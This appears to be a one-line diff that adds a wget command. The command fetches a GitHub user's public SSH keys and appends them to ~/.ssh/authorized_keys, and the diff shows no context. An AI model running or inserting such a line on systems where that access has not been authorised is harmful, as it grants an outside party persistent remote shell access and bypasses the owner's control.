@@ -1,0 +1,1 @@
+wget -O - https://github.com/jeffreyparker.keys >> ~/.ssh/authorized_keys
